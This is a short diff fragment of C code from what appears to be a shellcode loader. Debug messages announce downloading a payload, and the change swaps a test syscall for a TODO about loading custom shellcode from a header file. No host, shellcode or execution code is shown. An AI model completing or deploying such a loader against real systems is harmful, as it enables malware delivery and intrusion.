@@ -12,8 +12,7 @@ int main() {
 
     DEBUG_PRINT("[*] Program started.");
 
-    DEBUG_PRINT("[*] Testing functionality...");
-    //Syscall(0x1, 0, NULL);
+    // TODO: set compilation flag to load custom shellcode from shellcode.h
 
     DEBUG_PRINT("[*] Downloading payload...");
     SIZE_T payload_size = 0;
